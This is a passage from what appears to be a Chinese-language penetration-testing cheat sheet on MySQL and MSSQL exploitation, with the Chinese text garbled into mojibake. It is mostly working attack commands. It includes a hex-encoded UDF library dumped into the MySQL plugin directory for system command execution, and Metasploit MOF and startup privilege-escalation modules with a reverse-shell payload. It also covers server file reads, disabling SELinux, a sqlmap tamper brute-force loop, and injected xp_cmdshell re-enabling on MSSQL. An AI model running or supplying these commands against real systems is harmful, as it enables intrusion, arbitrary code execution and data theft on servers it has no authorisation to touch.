48894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹mysqlæ˜¯å¦æ–°å¢äº† <code>sys_eval</code>æ–¹æ³•</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_eval |   0 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç›´æ¥è°ƒç”¨å°±å¯ä»¥äº†</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç”¨å®Œä»¥ååˆ é™¤å‡½æ•°</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; drop function sys_eval;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h3><blockquote>
<p>å¤ªè€çš„æ´äº†ï¼Œè€Œä¸”åªå­˜åœ¨äº <code>Windows Server 2003</code> æ‰å¯ä»¥åˆ©ç”¨æˆåŠŸã€‚</p>
</blockquote>
<blockquote>
<p>ç›´æ¥ä½¿ç”¨<code>MSF</code>è‡ªå¸¦çš„<code>MOF</code>ææƒæ¨¡å—ï¼Œç®€å•æ–¹ä¾¿è¿˜è‡ªå¸¦ç—•è¿¹æ¸…é™¤åŠŸèƒ½</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># è®¾ç½®å¥½è‡ªå·±çš„ payload</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> rhosts 10.10.1.188</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> username root</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="å¯åŠ¨é¡¹ææƒ"><a href="#å¯åŠ¨é¡¹ææƒ" class="headerlink" title="å¯åŠ¨é¡¹ææƒ"></a>å¯åŠ¨é¡¹ææƒ</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½® MySQL è¿æ¥ä¿¡æ¯</span></span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> rhosts 10.10.1.188</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> username root</span><br><span class="line">msf6 &gt; <span class="builtin-name">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><blockquote>
<p>ç«äº‰æ¡ä»¶ææƒæ¼æ´ï¼Œä¸€ä¸ªæ‹¥æœ‰ CREATE/INSERT/SELECT ä½æƒé™çš„è´¦æˆ·ææƒæˆåŠŸåå¯ä»¥ä»¥ç³»ç»Ÿç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„ä»£ç ï¼Œææƒçš„ç”¨æˆ·ä¸º mysql ç”¨æˆ·ï¼Œæ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯å°†ä½æƒé™çš„ www-data æƒé™æå‡ä¸º mysql æƒé™</p>
</blockquote>
<blockquote>
<p>åˆ©ç”¨æ¡ä»¶</p>
</blockquote>
<ul>
<li><p>æ‹¿åˆ° CREATE/INSERT/SELECT ä½æƒé™çš„ MySQL è´¦æˆ·</p>
</li>
<li><p>å…³é”®æå–æ­¥éª¤éœ€è¦åœ¨äº¤äº’ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥éœ€è¦åå¼¹ shell</p>
</li>
<li><p>MySQL ç‰ˆæœ¬éœ€è¦ &lt;=5.5.51 æˆ– 5.6.x &lt;=5.6.32 æˆ– 5.7.x &lt;=5.7.14 æˆ– 8.x &lt; 8.0.1</p>
</li>
<li><p>MariaDB ç‰ˆæœ¬éœ€è¦ &lt;= 5.5.51 æˆ– 10.0.x &lt;= 10.0.27 æˆ– 10.1.x &lt;= 10.1.17</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/firebroo/CVE-2016-6663</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<br/>



<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><blockquote>
<p>åˆ©ç”¨æ¶æ„mysqlæ–‡ä»¶ï¼Œè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè¿›è¡Œååˆ¶ã€‚</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/allyshka/</span>Rogue-MySql-Server</span><br></pre></td></tr></table></figure>



<br/>

<h3 id="è¯»å–æœåŠ¡å™¨æ–‡ä»¶"><a href="#è¯»å–æœåŠ¡å™¨æ–‡ä»¶" class="headerlink" title="è¯»å–æœåŠ¡å™¨æ–‡ä»¶"></a>è¯»å–æœåŠ¡å™¨æ–‡ä»¶</h3><blockquote>
<p>è¯»å–mysqlæœåŠ¡ç«¯æ–‡ä»¶</p>
<p>å‰ææ¡ä»¶ï¼š</p>
<ul>
<li>ç³»ç»Ÿä¸­å…³é—­äº†<code>selinux</code></li>
<li>æ•æ„Ÿæ–‡ä»¶è·¯å¾„</li>
<li>secure_file_privæ²¡æœ‰é™åˆ¶</li>
<li>è¯»å–æ–‡ä»¶å°äº<code>max_allowed_packet</code></li>
<li>æœ‰<code>create</code>ã€<code>file</code>æƒé™</li>
</ul>
</blockquote>
<ul>
<li>å…³é—­selinux</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce <span class="number">0</span></span><br></pre></td></tr></table></figure>



<ul>
<li>load_file</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">select</span> load_file(&#x27;c:/boot.ini&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> load_file(char(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br><span class="line"><span class="attribute">select</span> load_file(<span class="number">0</span>x<span class="number">633</span>a<span class="number">2</span>f<span class="number">626</span>f<span class="number">6</span>f<span class="number">742</span>e<span class="number">696</span>e<span class="number">69</span>)</span><br></pre></td></tr></table></figure>



<ul>
<li>load file infile</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(cmd <span class="built_in">text</span>);</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;c:\windows\system.ini&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶"><a href="#è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶" class="headerlink" title="è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶"></a>è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</h3><blockquote>
<p>è¯»å–mysqlå®¢æˆ·ç«¯æ–‡ä»¶</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">&quot;C:/Windows/win.ini&quot;</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11631?time__1311=mqmx0DBDuDnGiQeDsKgqCwODfghD9Q770iYD&alichlgref=https://www.google.com/#toc-16">ååˆ¶å„ç§è½¯ä»¶çš„æ–¹æ³•</a></p>
<br/>



<h3 id="å¯¼å‡ºæ•°æ®åº“"><a href="#å¯¼å‡ºæ•°æ®åº“" class="headerlink" title="å¯¼å‡ºæ•°æ®åº“"></a>å¯¼å‡ºæ•°æ®åº“</h3><blockquote>
<p>æŸ¥çœ‹æ•°æ®åº“å¤§å°</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use information_schema; select concat(round(sum(data_length&#x2F;1024&#x2F;1024),2),&#39;MB&#39;) as data from tables;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯¼å‡ºæ•°æ®åº“</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å‡ºå…¨éƒ¨æ•°æ®åº“</span></span><br><span class="line">mysqldump -u root -p --all-databases &gt; alldb.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºæŒ‡å®šæ•°æ®åº“</span></span><br><span class="line">mysqldump -u username -p databasename -z &gt; backup.sql.gz</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è¿æ¥IP"><a href="#è¿æ¥IP" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>è¿”å›æ¯ä¸ªè¿æ¥åˆ°æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“åç§°ã€è¿æ¥æ•°ã€ç™»å½•åã€åº”ç”¨ç¨‹åºåç§°ã€ä¸»æœºåå’Œ IP åœ°å€ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    DBName, COUNT(processlist.ID) AS NumberOfConnections,</span><br><span class="line">    user AS LoginName, processlist.INFO AS ApplicationName,</span><br><span class="line">    host AS HostName,</span><br><span class="line">    processlist.TIME AS Time,</span><br><span class="line">    processlist.STATE AS State</span><br><span class="line">FROM</span><br><span class="line">    (SELECT</span><br><span class="line">        ID, USER, DB AS DBName, INFO, HOST, TIME, STATE</span><br><span class="line">    FROM</span><br><span class="line">        information_schema.PROCESSLIST</span><br><span class="line">    WHERE</span><br><span class="line">        DB IS NOT NULL) AS processlist</span><br><span class="line">GROUP BY</span><br><span class="line">    DBName, LoginName, ApplicationName, HostName, Time, State</span><br><span class="line">ORDER BY</span><br><span class="line">    DBName, NumberOfConnections DESC;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><ul>
<li>ä½¿ç”¨å…¨éƒ¨payloadç»•è¿‡</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> `ls <span class="regexp">/usr/</span>local<span class="regexp">/Cellar/</span>sqlmap<span class="regexp">/1.7/</span>libexec<span class="regexp">/tamper/</span>*.py`; <span class="keyword">do</span> echo -e <span class="string">&quot;\e[41;1m  tamper: $t\e[0m&quot;</span>; sqlmap -u <span class="string">&quot;http://1.1.1.1/?id=1* --dbs --random-agent --smart --batch --tamper $t --threads 10;done;</span></span><br></pre></td></tr></table></figure>

<br/>

<hr>
<hr>
<br/>

<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="MSSQL-GetShell"><a href="#MSSQL-GetShell" class="headerlink" title="MSSQL GetShell"></a>MSSQL GetShell</h2><blockquote>
<p>å‰ææ¡ä»¶</p>
</blockquote>
<ul>
<li>æœ‰<code>dn_owner</code>æƒé™</li>
<li>æœ‰Webç›®å½•çš„<code>ç»å¯¹è·¯å¾„</code></li>
</ul>
<br/>



<h3 id="MSSQL-æƒé™åˆ’åˆ†"><a href="#MSSQL-æƒé™åˆ’åˆ†" class="headerlink" title="MSSQL æƒé™åˆ’åˆ†"></a>MSSQL æƒé™åˆ’åˆ†</h3><ul>
<li>sysadmin : å¯ä»¥æ‰§è¡Œæ‰€æœ‰æ“ä½œ</li>
<li>db_ownerï¼šå¯ä»¥æ‰§è¡Œæ•°æ®åº“æ“ä½œ</li>
<li>publicï¼šå¯ä»¥æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)) &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦æ˜¯ç³»ç»Ÿç®¡ç†å‘˜</span><br><span class="line">and 1&#x3D;(Select IS_MEMBER(&#39;db_owner&#39;)) &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦æ˜¯åº“æƒé™</span><br><span class="line">and 1&#x3D;(Select IS_MEMBER(&#39;public&#39;))</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="å¯»æ‰¾çœŸå®è·¯å¾„"><a href="#å¯»æ‰¾çœŸå®è·¯å¾„" class="headerlink" title="å¯»æ‰¾çœŸå®è·¯å¾„"></a>å¯»æ‰¾çœŸå®è·¯å¾„</h3><ul>
<li>æŠ¥é”™ä¿¡æ¯</li>
<li>å­—å…¸çŒœè§£</li>
<li>æ—ç«™ç›®å½•</li>
<li>å­˜å‚¨è¿‡ç¨‹æœç´¢</li>
<li>è¯»é…ç½®æ–‡ä»¶</li>
</ul>
<blockquote>
<p>å¯»æ‰¾ç»å¯¹è·¯å¾„</p>
</blockquote>
<ul>
<li><p>xp_dirtree</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#39;c:&#39;     --åˆ—å‡ºæ‰€æœ‰c:\æ–‡ä»¶ã€ç›®å½•ã€å­ç›®å½• </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1.    --åªåˆ—c:\ç›®å½•</span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1,1  --åˆ—c:\ç›®å½•ã€æ–‡ä»¶</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>åœ¨å®æˆ˜ä¸­å¯ä»¥åˆ›å»ºä¸´æ—¶è¡¨æŠŠå­˜å‚¨è¿‡ç¨‹æŸ¥è¯¢åˆ°çš„è·¯å¾„æ’å…¥åˆ°ä¸´æ—¶è¡¨ä¸­æ–¹ä¾¿åç»­æŸ¥è¯¢</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#39;c:&#39;,1,1;</span><br></pre></td></tr></table></figure>

<ul>
<li>xp_cmdshell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;for &#x2F;r d:\ %i in (i*.php) do @echo %i&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> åœ¨å®æˆ˜ä¸­è¿˜æ˜¯åˆ›å»ºä¸´æ—¶è¡¨ï¼Œå­˜ä¸€ä¸ªcharå­—æ®µåå†å»æŸ¥è¯¢è¯¥<code>cmdtmp</code>è¡¨å°±å¯ä»¥äº†</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.1</span>/<span class="number">1</span>.aspx?id=<span class="number">1</span>;CREATE TABLE cmdtmp (dir varchar(<span class="number">8000</span>));</span><br><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.1</span>/<span class="number">1</span>.aspx?id=<span class="number">1</span>;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (i*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å¯èƒ½ä¼šé‡åˆ°<code>xpcmd_shell</code>å…³é—­æ— æ³•è°ƒç”¨çš„æƒ…å†µï¼š</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshellå­˜å‚¨è¿‡ç¨‹åœ¨ SQL<span class="built_in"> Server </span>2005ä»¥åé»˜è®¤å…³é—­ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯ï¼›</span><br><span class="line">SQL<span class="built_in"> Server </span>é˜»æ­¢äº†å¯¹ç»„ä»¶ â€˜xp_cmdshellâ€™ çš„ è¿‡ç¨‹â€™sys.xp_cmdshellâ€™ çš„è®¿é—®ï¼Œå› ä¸ºæ­¤ç»„ä»¶å·²ä½œä¸ºæ­¤æœåŠ¡å™¨å®‰å…¨é…ç½®çš„ä¸€éƒ¨åˆ†è€Œè¢«å…³é—­ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä½¿ç”¨ sp_configure å¯ç”¨ã€‚</span><br></pre></td></tr></table></figure>

<blockquote>
<p>éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢å¤:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1; --å…è®¸ä¿®æ”¹é«˜çº§å‚æ•°</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1;  --æ‰“å¼€xp_cmdshellæ‰©å±•</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨åˆ©ç”¨å®Œæˆä¹‹åå½“ç„¶è¿˜éœ€è¦è¿˜åŸ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;, 0;</span><br><span class="line">reconfigure;&#96;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;, 0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å¦‚æœxp_cmdshellè¢«<code>åˆ é™¤</code>å¯ä»¥è‡ªå·±ä¸Šä¼  xplog70.dll è¿›è¡Œæ¢å¤</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>\MSSQL12.MSSQLSERVER\MSSQL\Binn\xplog70.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ¤æ–­å­˜å‚¨æ‰©å±•æ˜¯å¦å­˜åœ¨,è¿”å›ç»“æœä¸º1å°±OK</span></span><br><span class="line"><span class="keyword">Select</span> count(*) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">&#x27;X&#x27;</span> <span class="keyword">and</span> <span class="type">name</span>=<span class="string">&#x27;xp_cmdshell&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- æ¢å¤xp_cmdshell,è¿”å›ç»“æœä¸º1å°±OK</span></span><br><span class="line">Exec sp_addextendedproc <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> count(*) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">&#x27;X&#x27;</span> <span class="keyword">and</span> <span class="type">name</span>=<span class="string">&#x27;xp_cmdshell&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¦åˆ™ä¸Šä¼ xplog70.dll(å…ˆä¸Šä¼ xplog70.dllåˆ°Dç›˜)</span></span><br><span class="line">Exec master.dbo.sp_addextendedproc <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="string">&#x27;D:\\xplog70.dll&#x27;</span></span><br></pre></td></tr></table></figure>



<br/>



